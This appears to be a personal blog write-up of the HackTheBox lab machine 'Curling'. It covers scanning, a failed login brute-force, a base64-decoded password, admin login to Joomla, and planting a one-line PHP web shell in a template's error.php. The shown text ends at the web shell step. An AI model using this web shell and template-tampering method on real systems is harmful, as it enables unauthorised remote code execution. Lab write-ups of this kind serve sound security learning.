<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- iOS Safari -->
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- Chrome, Firefox OS and Opera Status Bar Color -->
<meta name="theme-color" content="#FFFFFF">
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
<link rel="stylesheet" type="text/css"
  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
<link rel="stylesheet" type="text/css" href="css/theme.css">
<link rel="stylesheet" type="text/css" href="css/notablog.css">
<!-- Favicon -->

  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">

<style>
  :root {
    font-size: 20px;
  }
</style>
  <title>HTB Machine — Curling&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
  <meta property="og:type" content="blog">
  <meta property="og:title" content="HTB Machine — Curling">
  
    <meta name="description" content="Curling is one of the older boxes on HTB, initially released in 2018. The box is very CTF-like, but requires nothing more than clever enumeration to complete. It starts with finding an exposed password that can be used to log in to Joomla as admin, then uploading a web shell using the admin’s privileges. Once on the box, I’ll recover a password for another user by reverting a hex dump and unzipping multiple layers of compression. For root, there’s a cron job running curl that can be hijacked.">
    <meta property="og:description" content="Curling is one of the older boxes on HTB, initially released in 2018. The box is very CTF-like, but requires nothing more than clever enumeration to complete. It starts with finding an exposed password that can be used to log in to Joomla as admin, then uploading a web shell using the admin’s privileges. Once on the box, I’ll recover a password for another user by reverting a hex dump and unzipping multiple layers of compression. For root, there’s a cron job running curl that can be hijacked.">
  
  
    <meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/50cbb1d2e9b638140641af95a7582ef6.png">
  
  <style>
    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
  <a href="/">
    <div class="Navbar__Btn">
      
        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
      
      <span>Home</span>
    </div>
  </a>
  <span class="Navbar__Delim">&centerdot;</span>
  <a href="https://github.com/ch3ng625", target="_blank">
    <div class="Navbar__Btn">
      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
      <span>GitHub</span>
    </div>
  </a>
  <span class="Navbar__Delim">&centerdot;</span>
  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
    <div class="Navbar__Btn">
      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
      <span>LinkedIn</span>
    </div>
  </a>
  <span class="Navbar__Delim">&centerdot;</span>
  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
    <div class="Navbar__Btn">
      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
      <span>HackTheBox</span>
    </div>
  </a>
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
</nav>

  <header class="Header">
    
    <div class="Header__Spacer Header__Spacer--NoCover">
    </div>
    
      <div class="Header__Icon">
        <span><img class="inline-img-icon" src="https://labs.hackthebox.com/storage/avatars/50cbb1d2e9b638140641af95a7582ef6.png"></span>
      </div>
    
    <h1 class="Header__Title">HTB Machine — Curling</h1>
    
      <div class="DateTagBar">
        
          <span class="DateTagBar__Item DateTagBar__Date">Posted on Fri, Feb 9, 2024</span>
        
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
            <a href="tag/HTB">HTB</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
            <a href="tag/Linux">Linux</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
            <a href="tag/Easy">Easy</a>
          </span>
        
      </div>
    
  </header>
  <article id="https://www.notion.so/d39a89f3c5fc489891edb2d312acacbd" class="PageRoot"><h3 id="https://www.notion.so/f96fc634f908439baa0b2b0fe9a9a209" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/f96fc634f908439baa0b2b0fe9a9a209"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h3><div id="https://www.notion.so/ebe334704b5c44dcaa56ae995a60eff9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Curling is one of the older boxes on HTB, initially released in 2018. The box is very CTF-like, but requires nothing more than clever enumeration to complete. It starts with finding an exposed password that can be used to log in to Joomla as admin, then uploading a web shell using the admin’s privileges. Once on the box, I’ll recover a password for another user by reverting a hex dump and unzipping multiple layers of compression. For root, there’s a cron job running </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString"> that can be hijacked.</span></span></p></div><div id="https://www.notion.so/36b3062691404d7cab78ac072fa5c405" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/fe9e806e1e6f415ebefbba67f2b4b500" class="Divider"></div><h3 id="https://www.notion.so/d35355bfd0d14568823c3b56261aeb4f" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/d35355bfd0d14568823c3b56261aeb4f"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h3><div id="https://www.notion.so/c6aaf701157f410f9c1cb498e730831e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Nmap:</strong></span></span></p></div><pre id="https://www.notion.so/7b02e18d08d6419a9cd9912073a6130d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/curling/enumeration/nmap]
└─$</span></mark></span><span class="SemanticString"><span> sudo nmap --min-rate 1000 -p- 10.129.12.187

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-06 22:13 ACDT
Nmap scan report for 10.129.12.187
Host is up (0.33s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 70.86 seconds

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/curling/enumeration/nmap]
└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 22,80 10.129.12.187

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-06 22:30 ACDT
Nmap scan report for 10.129.12.187
Host is up (0.33s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   330.36 ms 10.10.14.1
2   330.56 ms 10.129.12.187

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.44 seconds</span></span></span></code></pre><div id="https://www.notion.so/1f0df988584e40fbb4479238b2bbb1b5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Nmap found SSH and HTTP ports open. The script scan also identified a Joomla instance running.</span></span></p></div><div id="https://www.notion.so/7fad5b4edfb442aeba9e92719c5b0d4d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/c1ae391316b44865aa7ca5bc6a2705ac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP80 — HTTP:</strong></span></span></p></div><div id="https://www.notion.so/6c15df7a75324e459fa00206da9c75f1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The page is a standard Joomla CMS site.</span></span></p></div><div id="https://www.notion.so/9cb29e7808c243d9ab5d83b574da3ff6" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F0ffaab81-b1a1-4c0b-b260-3d2596ab258c%2FUntitled.png?width=1912&amp;table=block&amp;id=9cb29e78-08c2-43d9-ab5d-83b574da3ff6"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F0ffaab81-b1a1-4c0b-b260-3d2596ab258c%2FUntitled.png?width=1912&amp;table=block&amp;id=9cb29e78-08c2-43d9-ab5d-83b574da3ff6" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/f6069ea5e9744523a2f2f0360c8e934f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s 3 posts, all of them posted by </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Super User</code></span><span class="SemanticString">, and one of the post is signed off by “Floris”. I’ll note these down as they are potential login usernames.</span></span></p></div><div id="https://www.notion.so/965917eb6b1041449768d78538c477a4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Also, the page title contains “Cewl”, does that mean it involves login brute-forcing with a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cewl</code></span><span class="SemanticString">-generated wordlist? (Spoiler alert: it’s a rabbit hole)</span></span></p></div><div id="https://www.notion.so/016d736c3b7b4ded8fe0507b28a41aab" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/c2508179bc054321b6bafa759539d3c7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Login Brute-Force — Fail:</strong></span></span></p></div><div id="https://www.notion.so/131f60840efb413d84368861cfc64331" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.kali.org/tools/cewl/">cewl</a></span><span class="SemanticString"> is a tool that generates custom wordlist by crawling the target website and extracting words from its content. This is more commonly used for CTF challenges than in real-life applications.</span></span></p></div><div id="https://www.notion.so/e2597f25b9914afeb22a7ccabb722e3c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll use the tool to generate a wordlist, and save it as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">pass.txt</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/6de06c5f59b0460aa872eb679b73a7ff" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/curling/enumeration/tcp80]
└─$</span></mark></span><span class="SemanticString"><span> cewl http://10.129.12.187 &gt; pass.txt
</span></span></span></code></pre><div id="https://www.notion.so/b155cd773faf448c933ff2e070928a24" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll first capture a login POST request in Burp, then send it to Intruder for the brute-force, using my custom-generated payload.</span></span></p></div><div id="https://www.notion.so/61e3731dec644a62abbb591b226c8506" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F52e6d358-493e-4c25-9afd-9c0bbc99124d%2FUntitled.png?width=1158&amp;table=block&amp;id=61e3731d-ec64-4a62-abbb-591b226c8506"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F52e6d358-493e-4c25-9afd-9c0bbc99124d%2FUntitled.png?width=1158&amp;table=block&amp;id=61e3731d-ec64-4a62-abbb-591b226c8506" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1ce8c57fa50c404daa2908fc671e92bc" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Ff706dbc5-008a-4813-8eae-82f9e69f6893%2FUntitled.png?width=794&amp;table=block&amp;id=1ce8c57f-a50c-404d-aa29-08fc671e92bc"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Ff706dbc5-008a-4813-8eae-82f9e69f6893%2FUntitled.png?width=794&amp;table=block&amp;id=1ce8c57f-a50c-404d-aa29-08fc671e92bc" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/fbbdf5966ff942ca9899822c7e036fd6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Since the Community Edition version of Intruder is rate-limited at 1 request per second, the brute force took quite a while to complete, despite only having around 200 words in the payload.</span></span></p></div><div id="https://www.notion.so/8d63667997a34658b7f713a06ccf859c" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F3449196e-896d-4285-baee-1cadb2385f5a%2FUntitled.png?width=833&amp;table=block&amp;id=8d636679-97a3-4658-b7f7-13a06ccf859c"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F3449196e-896d-4285-baee-1cadb2385f5a%2FUntitled.png?width=833&amp;table=block&amp;id=8d636679-97a3-4658-b7f7-13a06ccf859c" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/9beb98c6d70641c59defe96380a6f350" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I tried logging in to both the main page and the administrator panel with different usernames (</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SuperUser</code></span><span class="SemanticString">, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">floris</code></span><span class="SemanticString">, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">admin</code></span><span class="SemanticString">, etc), but none of them worked. This is probably not the way to go.</span></span></p></div><div id="https://www.notion.so/559e54c88ad84b5f988ddcc503f3a80f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/e0db49b8cd67443580b7b83228683915" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Directory Busting:</strong></span></span></p></div><div id="https://www.notion.so/363cb69b1005463488220d1c32a40e94" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Seemingly running into a dead end, I’ll run a directory scan to check if there’s any hidden pages. Since it’s Joomla, I know the extension is </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.php</code></span><span class="SemanticString">. It’s also worth checking for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.txt</code></span><span class="SemanticString"> extension, as it’s common on older HTB boxes for hints.</span></span></p></div><pre id="https://www.notion.so/cd5330243a154e649ebc0bdb153c61da" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/curling/enumeration/tcp80]
└─$</span></mark></span><span class="SemanticString"><span> gobuster dir -u http://10.129.12.187 -w directory-list-2.3-medium.txt -t 100 -x php,txt

..SNIP..
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--&gt; http://10.129.12.187/images/]
/index.php            (Status: 200) [Size: 14265]
/media                (Status: 301) [Size: 314] [--&gt; http://10.129.12.187/media/]
/templates            (Status: 301) [Size: 318] [--&gt; http://10.129.12.187/templates/]
/modules              (Status: 301) [Size: 316] [--&gt; http://10.129.12.187/modules/]
/.php                 (Status: 403) [Size: 278]
/bin                  (Status: 301) [Size: 312] [--&gt; http://10.129.12.187/bin/]
/plugins              (Status: 301) [Size: 316] [--&gt; http://10.129.12.187/plugins/]
/includes             (Status: 301) [Size: 317] [--&gt; http://10.129.12.187/includes/]
/language             (Status: 301) [Size: 317] [--&gt; http://10.129.12.187/language/]
/README.txt           (Status: 200) [Size: 4872]
/components           (Status: 301) [Size: 319] [--&gt; http://10.129.12.187/components/]
/cache                (Status: 301) [Size: 314] [--&gt; http://10.129.12.187/cache/]
/libraries            (Status: 301) [Size: 318] [--&gt; http://10.129.12.187/libraries/]
/tmp                  (Status: 301) [Size: 312] [--&gt; http://10.129.12.187/tmp/]
/LICENSE.txt          (Status: 200) [Size: 18092]
/layouts              (Status: 301) [Size: 316] [--&gt; http://10.129.12.187/layouts/]
/secret.txt           (Status: 200) [Size: 17]
/administrator        (Status: 301) [Size: 322] [--&gt; http://10.129.12.187/administrator/]
/configuration.php    (Status: 200) [Size: 0]
/htaccess.txt         (Status: 200) [Size: 3005]
/cli                  (Status: 301) [Size: 312] [--&gt; http://10.129.12.187/cli/]</span></span></span></code></pre><div id="https://www.notion.so/895367fca2ff4b8abe952b6f45e2af1c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The scan found </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/secret.txt</code></span><span class="SemanticString">, which contains what looks like a base64-encoded string:</span></span></p></div><div id="https://www.notion.so/04181ffb56cc4e7785281cdba542d8b6" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Ffdf185d6-d09f-4826-aeb2-d0341c774311%2FUntitled.png?width=499&amp;table=block&amp;id=04181ffb-56cc-4e77-8528-1cdba542d8b6"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Ffdf185d6-d09f-4826-aeb2-d0341c774311%2FUntitled.png?width=499&amp;table=block&amp;id=04181ffb-56cc-4e77-8528-1cdba542d8b6" style="width:499px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/6888ce03774a41b5af17b3d3608cebe4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Decoding it gets us </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Curling2018!</code></span><span class="SemanticString">, which looks like a password to me.</span></span></p></div><pre id="https://www.notion.so/09bebf922e0941feadc87985fdf9f88d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/curling/enumeration/tcp80]
└─$</span></mark></span><span class="SemanticString"><span> echo Q3VybGluZzIwMTgh | base64 -d

Curling2018!</span></span></span></code></pre><div id="https://www.notion.so/011eda76b7ed46339bc1f25d8919f2c3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/efa4ba37a828420bbcd1b52897341cea" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Admin Login:</strong></span></span></p></div><div id="https://www.notion.so/a6ceed63f65c4aa28e30fc80633717bc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">GoBuster also identified </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/administrator</code></span><span class="SemanticString">, which is the administrative login page. I’ll attempt a password spray here, and log in as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">floris</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/50b725a04d93421bbb1e9dca81789b7a" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1202cc23-05ac-4924-80ac-bab17683a1f6%2FUntitled.png?width=1911&amp;table=block&amp;id=50b725a0-4d93-421b-bb1e-9dca81789b7a"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1202cc23-05ac-4924-80ac-bab17683a1f6%2FUntitled.png?width=1911&amp;table=block&amp;id=50b725a0-4d93-421b-bb1e-9dca81789b7a" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/5b738be984744c648bac2ea1ec28a925" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/efafa58f90134a8bac474f8ad376e9fd" class="Divider"></div><h3 id="https://www.notion.so/7e8cf3f17f8a4ebd8c7070f185caac18" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/7e8cf3f17f8a4ebd8c7070f185caac18"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Foothold:</span></span></h3><div id="https://www.notion.so/712857bc071f48ebb706935aec4e8abc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Joomla Template Hijack:</strong></span></span></p></div><div id="https://www.notion.so/a302649a86e74620bb46127117778240" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Similar to WordPress, Joomla also have admin-customizable page templates, which can be </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce">maliciously tampered</a></span><span class="SemanticString"> for RCE.</span></span></p></div><div id="https://www.notion.so/03e2b65182674a4aad89738e45671221" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll target the Beez3 template, since it’s not currently in use.</span></span></p></div><div id="https://www.notion.so/f5773dcb79c4429099c7253f50f834da" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F221dfe12-adfc-48a0-827c-b598cb2c042d%2FUntitled.png?width=1901&amp;table=block&amp;id=f5773dcb-79c4-4290-99c7-253f50f834da"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F221dfe12-adfc-48a0-827c-b598cb2c042d%2FUntitled.png?width=1901&amp;table=block&amp;id=f5773dcb-79c4-4290-99c7-253f50f834da" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d4e8eda9bb347b7a099a1b4c69cd2dc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And replace all contents of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">error.php</code></span><span class="SemanticString"> with the following web shell.</span></span></p></div><pre id="https://www.notion.so/320dfda4096b4a778fb4e21968665abc" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></span></span></span></code></pre><div id="https://www.notion.so/efe631832d57494a9c44b5b7335ee32d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After saving, the web shell can be directly accessed via the browser at </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/templates/beez3/error.php?cmd=id</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/c9a9864e9d9f42b082d4199acb71ac92" class="Image Image--PageWidth"><figure><a 